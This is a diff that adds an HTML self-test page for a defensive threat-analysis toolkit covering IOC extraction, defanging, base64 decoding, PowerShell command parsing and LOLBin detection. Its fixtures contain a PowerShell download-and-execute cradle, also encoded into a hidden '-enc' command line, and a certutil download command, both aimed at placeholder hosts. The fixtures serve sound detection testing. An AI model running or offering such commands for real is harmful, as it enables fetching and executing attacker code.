@@ -1,0 +1,117 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>toolbelt self-test</title>
+<h1>toolbelt self-test</h1>
+<p id="tally"></p>
+<pre id="results"></pre>
+
+<script type="module">
+import {
+  patterns, extractIOCs, defang, refang,
+  PS_FLAG_MAP, PS_RISK_FLAGS, LOLBIN_DB,
+  psDecodeBase64, smartDecodeBase64, psParseCommandLine, lolbinAnalyze
+} from "../../site/js/toolbelt/tools.js";
+
+const results = document.getElementById("results");
+let pass = 0, fail = 0;
+
+function ok(name, cond, detail) {
+  if (cond) { pass++; results.textContent += `PASS  ${name}\n`; }
+  else { fail++; results.textContent += `FAIL  ${name}${detail ? "  — " + detail : ""}\n`; }
+}
+function eq(name, actual, expected) {
+  ok(name, actual === expected, `got ${JSON.stringify(actual)}, want ${JSON.stringify(expected)}`);
+}
+
+// ── module shape ─────────────────────────────────────────────────────────
+ok("tools.js exports all expected members",
+   [patterns, extractIOCs, defang, refang, PS_FLAG_MAP, PS_RISK_FLAGS,
+    LOLBIN_DB, psDecodeBase64, smartDecodeBase64, psParseCommandLine,
+    lolbinAnalyze].every(v => v != null));
+eq("LOLBIN_DB entry count", Object.keys(LOLBIN_DB).length, 33);
+
+// ── defang / refang round-trips ──────────────────────────────────────────
+const URL_IOC = "https://malicious-host.com/payload.ps1";
+const defangedUrl = defang(URL_IOC);
+ok("defang(url) neutralises scheme and dot",
+   defangedUrl.includes("hxxps") && defangedUrl.includes("[://]") && defangedUrl.includes("[.]"),
+   defangedUrl);
+eq("refang(defang(url)) round-trips", refang(defangedUrl), URL_IOC);
+
+const IP_IOC = "185.220.101.42";
+const defangedIp = defang(IP_IOC);
+eq("defang(ip)", defangedIp, "185.220.101[.]42");
+eq("refang(defang(ip)) round-trips", refang(defangedIp), IP_IOC);
+
+// ── IOC extraction ───────────────────────────────────────────────────────
+const SHA256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";
+const paragraph = `On 2026-08-01 the host beaconed to 185.220.101.42 and resolved
+updates.malicious-host.com before dropping a binary with SHA-256 ${SHA256}.
+The operator exploited CVE-2026-31245 for initial access; reports went to
+soc@example.com and the stage-2 pull came from https://malicious-host.com/b.bin.`;
+const iocs = extractIOCs(paragraph);
+
+ok("extractIOCs finds the IPv4", iocs.ips.includes("185.220.101.42"), JSON.stringify(iocs.ips));
+ok("extractIOCs finds a domain", iocs.domains.some(d => d.toLowerCase().includes("malicious-host.com")),
+   JSON.stringify(iocs.domains));
+ok("extractIOCs finds the SHA-256", iocs.sha256s.map(h => h.toLowerCase()).includes(SHA256),
+   JSON.stringify(iocs.sha256s));
+ok("extractIOCs finds the CVE", iocs.cves.map(c => c.toUpperCase()).includes("CVE-2026-31245"),
+   JSON.stringify(iocs.cves));
+ok("extractIOCs does not misfile the IP as a domain",
+   !iocs.domains.includes("185.220.101.42"), JSON.stringify(iocs.domains));
+ok("extractIOCs finds the URL", iocs.urls.length === 1, JSON.stringify(iocs.urls));
+ok("extractIOCs finds the email", iocs.emails.includes("soc@example.com"), JSON.stringify(iocs.emails));
+
+// ── smartDecodeBase64: UTF-16LE fixture built in-page ────────────────────
+const PAYLOAD = "IEX (New-Object Net.WebClient).DownloadString('http://x/a')";
+const B64_UTF16 = btoa(String.fromCharCode(...[...PAYLOAD].flatMap(c => [c.charCodeAt(0), 0])));
+
+const dec = smartDecodeBase64(B64_UTF16);
+ok("smartDecodeBase64 returns a result for the UTF-16LE fixture", dec != null);
+eq("smartDecodeBase64 decodes the UTF-16LE text", dec && dec.text, PAYLOAD);
+eq("smartDecodeBase64 reports UTF-16LE", dec && dec.encoding, "UTF-16LE");
+
+const decUtf8 = smartDecodeBase64(btoa("plain single-byte payload"));
+eq("smartDecodeBase64 falls back to UTF-8", decUtf8 && decUtf8.encoding, "UTF-8");
+eq("smartDecodeBase64 decodes the UTF-8 text", decUtf8 && decUtf8.text, "plain single-byte payload");
+eq("smartDecodeBase64 returns null on empty input", smartDecodeBase64("   "), null);
+
+// ── psParseCommandLine ───────────────────────────────────────────────────
+const CMD = `powershell.exe -nop -w hidden -enc ${B64_UTF16}`;
+const p = psParseCommandLine(CMD);
+const resolved = p.flags.map(f => f.resolved);
+
+eq("psParseCommandLine identifies the binary", p.binary, "powershell");
+ok("psParseCommandLine resolves -nop to -NoProfile", resolved.includes("-NoProfile"), resolved.join("|"));
+ok("psParseCommandLine resolves -w to -WindowStyle", resolved.some(r => r.startsWith("-WindowStyle")),
+   resolved.join("|"));
+ok("psParseCommandLine resolves -enc to -EncodedCommand", resolved.includes("-EncodedCommand"),
+   resolved.join("|"));
+eq("psParseCommandLine captures the encoded payload", p.encodedPayload, B64_UTF16);
+eq("psParseCommandLine surfaces the decoded payload", p.decodedPayload, PAYLOAD);
+eq("psParseCommandLine scores overall risk HIGH", p.risk, "HIGH");
+ok("psParseCommandLine explains the risky flags", p.riskReasons.length >= 2,
+   JSON.stringify(p.riskReasons.map(r => r.flag)));
+ok("psParseCommandLine maps MITRE T1059.001 + T1027",
+   p.mitre.includes("T1059.001") && p.mitre.includes("T1027"), p.mitre.join(","));
+
+// ── lolbinAnalyze ────────────────────────────────────────────────────────
+const l = lolbinAnalyze("certutil.exe -urlcache -split -f http://x/a");
+ok("lolbinAnalyze returns a populated result", l != null && l.entry != null);
+eq("lolbinAnalyze identifies the binary", l && l.binary, "certutil");
+eq("lolbinAnalyze returns a MITRE technique", l && l.entry.mitre, "T1140");
+eq("lolbinAnalyze returns the risk level", l && l.entry.risk, "HIGH");
+ok("lolbinAnalyze matches the suspicious flags",
+   l && ["-urlcache", "-split", "-f"].every(f => l.flagsFound.some(x => x.flag === f)),
+   l ? JSON.stringify(l.flagsFound.map(x => x.flag)) : "null");
+eq("lolbinAnalyze returns null for an unknown binary", lolbinAnalyze("notepad.exe foo.txt"), null);
+
+// ── tally ────────────────────────────────────────────────────────────────
+const tally = document.getElementById("tally");
+tally.textContent = `${pass} PASS / ${fail} FAIL / ${pass + fail} total`;
+tally.style.color = fail === 0 ? "green" : "red";
+tally.style.fontWeight = "bold";
+document.title = `${fail === 0 ? "OK" : "FAIL"} — toolbelt self-test`;
+window.__TOOLBELT_TEST__ = { pass, fail };
+</script>
